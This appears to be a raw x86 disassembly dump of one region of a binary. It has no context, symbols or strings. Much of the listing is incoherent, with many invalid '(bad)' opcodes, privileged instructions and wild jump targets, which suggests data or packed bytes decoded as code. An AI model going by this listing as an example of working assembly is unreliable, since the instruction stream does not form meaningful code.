  40def1:	loope  0x40dece
  40def3:	iret   
  40def4:	in     eax,dx
  40def5:	call   0x11de6db6
  40defa:	data16 (bad) 
  40defc:	in     eax,0x52
  40defe:	inc    eax
  40deff:	stos   BYTE PTR es:[edi],al
  40df00:	xor    al,0x31
  40df02:	mov    ah,0xa3
  40df04:	cmp    DWORD PTR [ebp+ebx*1+0x2c],ecx
  40df08:	xchg   ebx,eax
  40df09:	fld    QWORD PTR [eax+0xc]
  40df0c:	adc    al,0x77
  40df0e:	mov    ebx,ebp
  40df10:	shl    DWORD PTR [edi+0x1e549965],1
  40df16:	test   edi,0xa42830d
  40df1c:	sbb    cl,BYTE PTR [edi-0x2e]
  40df1f:	enter  0x2af5,0x15
  40df23:	adc    eax,0xc3de490f
  40df28:	xor    al,0xd1
  40df2a:	pop    edx
  40df2b:	and    eax,0x1d645f11
  40df30:	cmp    BYTE PTR [ebx-0x465b5cb2],ah
  40df36:	sbb    eax,0x5aff207c
  40df3b:	cmp    BYTE PTR [esp+edx*8+0x3b255d7],0x62
  40df43:	push   ecx
  40df44:	mov    bh,0x21
  40df46:	fwait
  40df47:	imul   edi,DWORD PTR ds:0x5c13f512,0xa64366a8
  40df51:	inc    eax
  40df52:	jo     0x40dfbc
  40df54:	xor    al,0xe9
  40df56:	mov    ecx,0x6e2d6732
  40df5b:	or     BYTE PTR [ebx-0x64],bl
  40df5e:	cli    
  40df5f:	and    edi,eax
  40df61:	jecxz  0x40dfae
  40df63:	aad    0x32
  40df65:	add    eax,ebx
  40df67:	add    DWORD PTR ds:0x73c2d7e2,esi
  40df6d:	xor    dl,BYTE PTR [ecx]
  40df6f:	push   ss
  40df70:	pop    esp
  40df71:	push   es
  40df72:	mov    fs,WORD PTR [esi+0x2b38a355]
  40df78:	fld    DWORD PTR [edi+0x458b49cb]
  40df7e:	in     al,0xf
  40df80:	scas   eax,DWORD PTR es:[edi]
  40df81:	rol    DWORD PTR [ebx],0xe0
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	ror    DWORD PTR [ecx-0x13],1
  40dfa9:	lods   eax,DWORD PTR ds:[si]
  40dfab:	xchg   DWORD PTR [edi+0x7f3f7e7e],eax
  40dfb1:	jle    0x40e031
  40dfb3:	pop    ds
  40dfb4:	pop    ecx
  40dfb5:	jnp    0x40dfce
  40dfb7:	xor    eax,0x46c7eadf
  40dfbc:	and    al,cl
  40dfbe:	jle    0x40e022
  40dfc0:	add    ebx,DWORD PTR [eax-0x148892c6]
  40dfc6:	lea    eax,[ebp+0x722434cb]
  40dfcc:	jo     0x40df78
  40dfce:	or     eax,0xaac8ac63
  40dfd3:	push   cs
  40dfd4:	push   edx
  40dfd5:	nop
  40dfd6:	arpl   WORD PTR [esi],bx
  40dfd8:	push   ecx
  40dfd9:	lahf   
  40dfda:	fwait
  40dfdb:	popf   
  40dfdc:	nop
  40dfdd:	sub    ah,ch
  40dfdf:	push   es
  40dfe0:	add    al,0x3
  40dfe2:	and    DWORD PTR [eax+0x4],0xf0c7adc0
  40dfe9:	ds int3 
  40dfeb:	popa   
  40dfec:	(bad)
  40dff0:	xchg   edx,eax
  40dff1:	mov    edx,0x5e254520
  40dff6:	or     BYTE PTR [edi],al
  40dff8:	cmp    al,0x8d
  40dffa:	jnp    0x40dffe
  40dffc:	fimul  WORD PTR [edi+0x22]
  40dfff:	call   0xba724dbe
  40e004:	pop    edx
  40e005:	stos   BYTE PTR es:[edi],al
  40e006:	push   eax
  40e007:	push   es
  40e008:	pop    esi
  40e009:	cli    
  40e00a:	loopne 0x40e034
  40e00c:	xor    BYTE PTR [edi+ecx*2],cl
  40e00f:	adc    DWORD PTR [edi+0x26355bcd],ebx
  40e015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e016:	outs   dx,BYTE PTR ds:[esi]
  40e017:	mov    ds:0x66de7827,eax
  40e01c:	leave  
  40e01d:	nop
  40e01e:	aaa    
  40e01f:	mov    dh,0xc7
  40e021:	cs pop esp
  40e023:	test   BYTE PTR [edx+ebx*1+0x162c7899],bh
  40e02a:	iret   
  40e02b:	xor    ebx,esp
  40e02d:	lods   eax,DWORD PTR ds:[esi]
  40e02e:	xchg   ebx,eax
  40e02f:	ficom  DWORD PTR [ebx]
  40e031:	pop    ss
  40e032:	mov    esp,0x22cc6cfe
  40e037:	inc    esi
  40e038:	sub    DWORD PTR fs:[ebx+eax*4+0x3bcc3bb4],edi
  40e040:	jns    0x40e092
  40e042:	inc    esi
  40e043:	and    eax,0xb085f130
  40e048:	jb     0x40e008
  40e04a:	into   
  40e04b:	adc    DWORD PTR [edx],eax
  40e04d:	neg    BYTE PTR [esi]
  40e04f:	ror    DWORD PTR [ecx+esi*1],0xbf
  40e053:	sbb    eax,0xa1bac4c9
  40e058:	retf   0xdd6a
  40e05b:	push   ebp
  40e05c:	cld    
  40e05d:	shl    DWORD PTR [edi+0x6c828e5e],1
  40e063:	inc    ebx
  40e064:	rcl    BYTE PTR [ecx-0xa],cl
  40e067:	pushf  
  40e068:	sbb    DWORD PTR [edi+0x37],edx
  40e06b:	call   FWORD PTR [esi-0x61]
  40e06e:	inc    ebx
  40e06f:	(bad)  
  40e070:	mov    esi,0x20246631
  40e075:	pop    ebp
  40e076:	adc    eax,DWORD PTR [esi+eax*1-0x50]
  40e07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e07b:	fwait
  40e07c:	adc    ah,BYTE PTR [edi]
  40e07e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e07f:	imul   edx,DWORD PTR [ebp-0x532ab698],0xf7e7464e
  40e089:	ds cmp ch,dh
  40e08c:	cdq    
  40e08d:	mov    es,WORD PTR ds:[eax-0x17b778f8]
  40e094:	shl    BYTE PTR [edi],1
  40e096:	mov    al,0xee
  40e098:	out    dx,eax
  40e099:	pop    ss
  40e09a:	or     esi,eax
  40e09c:	fnsave es:[edi-0x15868e3b]
  40e0a3:	cmc    
  40e0a4:	adc    BYTE PTR [esp+ebp*1],bl
  40e0a7:	sub    eax,0xe3e38253
  40e0ac:	cmp    ebx,DWORD PTR [ecx-0x27]
  40e0af:	ss js  0x40e0f9
  40e0b2:	shr    BYTE PTR [edx+0x35],0xef
  40e0b6:	bound  eax,QWORD PTR [ebx-0x2f]
  40e0b9:	data16 cmp bh,ch
  40e0bc:	sbb    al,BYTE PTR [ecx-0x5c6e7ba7]
  40e0c2:	inc    ebx
  40e0c3:	xchg   edx,eax
  40e0c4:	cmc    
  40e0c5:	(bad)  
  40e0c7:	and    al,0x7
  40e0c9:	pop    bx
  40e0cb:	dec    esp
  40e0cc:	push   ecx
  40e0cd:	imul   esi,eax,0x51c04cfa
  40e0d3:	in     al,dx
  40e0d4:	push   esp
  40e0d5:	push   cs
  40e0d6:	jecxz  0x40e0f2
  40e0d8:	add    esp,ebp
  40e0da:	ds mov edi,0x3b80ee74
  40e0e0:	imul   eax,DWORD PTR [ecx+0x4532e044],0x23f89ebb
  40e0ea:	imul   eax,DWORD PTR [esi+0x318b9433],0x67
  40e0f1:	jge    0x40e0a7
  40e0f3:	xchg   DWORD PTR [ebx+0x5e5ff445],ecx
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
